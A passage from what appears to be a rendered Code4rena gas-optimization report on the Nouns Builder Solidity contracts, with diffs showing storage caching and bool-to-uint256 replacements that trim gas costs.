snapshot --diff</code>: <strong>12 481</strong> Gas Saved</p>\n<p>Caching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs or having local caches of state variable contracts/addresses.</p>\n<p>SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol\">src/auction/Auction.sol</a></li>\n</ul>\n<p>function: <code>_settleAuction</code>: <code>auction</code> cached in 169 but readed from storage in 172\nfunction: <code>_handleOutgoingTransfer</code>: <code>IWETH(WETH)</code> can be cached</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/auction/Auction.sol b/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 794da99..3ef53f5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -356,11 +356,13 @@ contract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">356, 356:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">357, 357:         // If the transfer failed:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">358, 358:         if (!success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      359:+            IWETH iweth = IWETH(WETH);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      360:+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">359, 361:             // Wrap as WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 360     :-            IWETH(WETH).deposit{ value: _amount }();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      362:+            iweth.deposit{ value: _amount }();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">361, 363:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">362, 364:             // Transfer WETH instead</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 363     :-            IWETH(WETH).transfer(_to, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      365:+            iweth.transfer(_to, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">364, 366:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">365, 367:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">366, 368:</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol\">src/governance/governor/Governor.sol</a></li>\n</ul>\n<p>function proposalVotes: There is no need to copy <code>proposals[_proposalId]</code> to memory, because you reading every field exactly one time</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 0d963c5..c8fb215 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -505,9 +505,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">505, 505:             uint256</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">506, 506:         )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">507, 507:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 508     :-        Proposal memory proposal = proposals[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 509     :-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 510     :-        return (proposal.againstVotes, proposal.forVotes, proposal.abstainVotes);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      508:+        return (proposals[_proposalId].againstVotes, proposals[_proposalId].forVotes, proposals[_proposalId].abstainVotes);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">511, 509:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">512, 510:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">513, 511:     /// @notice The timestamp valid to execute a proposal</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/treasury/Treasury.sol\">src/governance/treasury/Treasury.sol</a></li>\n</ul>\n<p>function <code>isReady</code>: <code>timestamps[_proposalId]</code> can be cached</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/treasury/Treasury.sol b/src/governance/treasury/Treasury.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b78bc8c..ce94e3b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/treasury/Treasury.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/treasury/Treasury.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -86,7 +86,8 @@ contract Treasury is ITreasury, UUPS, Ownable, TreasuryStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">86,  86:     /// @notice If a proposal is ready to execute (does not consider expiration)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">87,  87:     /// @param _proposalId The proposal id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">88,  88:     function isReady(bytes32 _proposalId) public view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  89     :-        return timestamps[_proposalId] != 0 &amp;&amp; block.timestamp &gt;= timestamps[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       89:+        uint256 timestamp = timestamps[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       90:+        return timestamp != 0 &amp;&amp; block.timestamp &gt;= timestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">90,  91:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">91,  92:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">92,  93:     ///                                                          ///</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol\">src/token/Token.sol</a></li>\n</ul>\n<p>function <code>_isForFounder</code>: use storage pointer to founder</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/token/Token.sol b/src/token/Token.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index afad142..ef92fe6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/token/Token.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/token/Token.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -178,14 +178,16 @@ contract Token is IToken, UUPS, ReentrancyGuard, ERC721Votes, TokenStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">178, 178:         // Get the base token id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">179, 179:         uint256 baseTokenId = _tokenId % 100;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">180, 180:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      181:+        Founder storage _founder = tokenRecipient[baseTokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      182:+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">181, 183:         // If there is no scheduled recipient:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 182     :-        if (tokenRecipient[baseTokenId].wallet == address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      184:+        if (_founder.wallet == address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">183, 185:             return false;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">184, 186:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">185, 187:             // Else if the founder is still vesting:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 186     :-        } else if (block.timestamp &lt; tokenRecipient[baseTokenId].vestExpiry) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      188:+        } else if (block.timestamp &lt; _founder.vestExpiry) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">187, 189:             // Mint the token to the founder</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 188     :-            _mint(tokenRecipient[baseTokenId].wallet, _tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      190:+            _mint(_founder.wallet, _tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">189, 191:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">190, 192:             return true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">191, 193:</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol\">src/token/metadata/MetadataRenderer.sol</a></li>\n</ul>\n<p>function <code>_getItemImage</code>: complex expression can be cached as storage pointer</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/token/metadata/MetadataRenderer.sol b/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 7a140ec..6640988 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -253,10 +253,11 @@ contract MetadataRenderer is IPropertyIPFSMetadataRenderer, UUPS, Ownable, Metad</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">253, 253:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">254, 254:     /// @dev Encodes the reference URI of an item</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">255, 255:     function _getItemImage(Item memory _item, string memory _propertyName) private view returns (string memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      256:+        IPFSGroup storage _ipfsData = ipfsData[_item.referenceSlot];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">256, 257:         return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">257, 258:             UriEncode.uriEncode(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">258, 259:                 string(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 259     :-                    abi.encodePacked(ipfsData[_item.referenceSlot].baseUri, _propertyName, &quot;/&quot;, _item.name, ipfsData[_item.referenceSlot].extension)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      260:+                    abi.encodePacked(_ipfsData.baseUri, _propertyName, &quot;/&quot;, _item.name, _ipfsData.extension)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">260, 261:                 )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">261, 262:             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">262, 263:     }</span></span></span></code></pre>\n<h2 id=\"g-04-using-bools-for-storage-incurs-overhead-5-instances\" style=\"position:relative;\"><a href=\"#g-04-using-bools-for-storage-incurs-overhead-5-instances\" aria-label=\"g 04 using bools for storage incurs overhead 5 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Using bools for storage incurs overhead (5 instances)</h2>\n<p>Deployment Gas Saved: <strong>60 668</strong><br>\nAvg. Method Call Gas Saved: <strong>1 191</strong><br>\n<code>forge snapshot --diff</code>: <strong>9 748</strong> Gas Saved</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// Booleans are more expensive than uint256 or any type that takes up a full</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// word because each write operation emits an extra SLOAD to first read the</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// back. This is the compiler&#39;s defense against contract upgrades and</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// pointer aliasing, and it cannot be disabled.</span></span></code></pre>\n<p>Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past</p>\n<p>NOTE: in some cases, usually in structs, this optimization can cause significant user gas loss, these cases are intentionally excluded from the report</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol\">src/governance/governor/Governor.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 0d963c5..62506ae 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -255,13 +255,13 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    255, 255:         if (state(_proposalId) != ProposalState.Active) revert VOTING_NOT_STARTED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    256, 256:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    257, 257:         // Ensure the voter hasn&#39;t already voted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 258     :-        if (hasVoted[_proposalId][_voter]) revert ALREADY_VOTED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      258:+        if (1==hasVoted[_proposalId][_voter]) revert ALREADY_VOTED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    259, 259:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    260, 260:         // Ensure the vote is valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    261, 261:         if (_support &gt; 2) revert INVALID_VOTE();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    262, 262:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    263, 263:         // Record the voter as having voted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 264     :-        hasVoted[_proposalId][_voter] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      264:+        hasVoted[_proposalId][_voter] = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    265, 265:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    266, 266:         // Get the pointer to the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    267, 267:         Proposal storage proposal = proposals[_proposalId];</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/storage/GovernorStorageV1.sol\">src/governance/governor/storage/GovernorStorageV1.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/governor/storage/GovernorStorageV1.sol b/src/governance/governor/storage/GovernorStorageV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index beff22e..25d7ff2 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/governor/storage/GovernorStorageV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/governor/storage/GovernorStorageV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -16,5 +16,5 @@ contract GovernorStorageV1 is GovernorTypesV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    16,  16:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    17,  17:     /// @notice If a user has voted on a proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    18,  18:     /// @dev Proposal Id =&gt; User =&gt; Has Voted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  19     :-    mapping(bytes32 =&gt; mapping(address =&gt; bool)) internal hasVoted;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       19:+    mapping(bytes32 =&gt; mapping(address =&gt; uint256)) internal hasVoted;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    20,  20: }</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721.sol\">src/lib/token/ERC721.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/lib/token/ERC721.sol b/src/lib/token/ERC721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 36a4bed..5808613 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/lib/token/ERC721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/lib/token/ERC721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -35,7 +35,7 @@ abstract contract ERC721 is IERC721, Initializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    35,  35:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    36,  36:     /// @notice The balance approvals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    37,  37:     /// @dev Owner =&gt; Operator =&gt; Approved</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  38     :-    mapping(address =&gt; mapping(address =&gt; bool)) internal operatorApprovals;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       38:+    mapping(address =&gt; mapping(address =&gt; uint256)) internal operatorApprovals;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    39,  39:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    40,  40:     ///                                                          ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    41,  41:     ///                           FUNCTIONS                      ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -75,7 +75,7 @@ abstract contract ERC721 is IERC721, Initializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    75,  75:     /// @param _owner The owner address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    76,  76:     /// @param _operator The operator address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    77,  77:     function isApprovedForAll(address _owner, address _operator) external view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  78     :-        return operatorApprovals[_owner][_operator];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       78:+        return 1==operatorApprovals[_owner][_operator];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    79,  79:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    80,  80:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    81,  81:     /// @notice The number of tokens owned</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -102,7 +102,7 @@ abstract contract ERC721 is IERC721, Initializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    102, 102:     function approve(address _to, uint256 _tokenId) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    103, 103:         address owner = owners[_tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    104, 104:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 105     :-        if (msg.sender != owner &amp;&amp; !operatorApprovals[owner][msg.sender]) revert INVALID_APPROVAL();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      105:+        if (msg.sender != owner &amp;&amp; 0==operatorApprovals[owner][msg.sender]) revert INVALID_APPROVAL();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    106, 106:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    107, 107:         tokenApprovals[_tokenId] = _to;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    108, 108:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -113,7 +113,7 @@ abstract contract ERC721 is IERC721, Initializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    113, 113:     /// @param _operator The account address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    114, 114:     /// @param _approved If permission is being given or removed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    115, 115:     function setApprovalForAll(address _operator, bool _approved) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 116     :-        operatorApprovals[msg.sender][_operator] = _approved;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      116:+        operatorApprovals[msg.sender][_operator] = _approved ? 1 : 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    117, 117:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    118, 118:         emit ApprovalForAll(msg.sender, _operator, _approved);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    119, 119:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -131,7 +131,7 @@ abstract contract ERC721 is IERC721, Initializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    131, 131:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    132, 132:         if (_to == address(0)) revert ADDRESS_ZERO();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    133, 133:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 134     :-        if (msg.sender != _from &amp;&amp; !operatorApprovals[_from][msg.sender] &amp;&amp; msg.sender != tokenApprovals[_tokenId]) revert INVALID_APPROVAL();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      134:+        if (msg.sender != _from &amp;&amp; 0==operatorApprovals[_from][msg.sender] &amp;&amp; msg.sender != tokenApprovals[_tokenId]) revert INVALID_APPROVAL();</span></span></span>\n<span 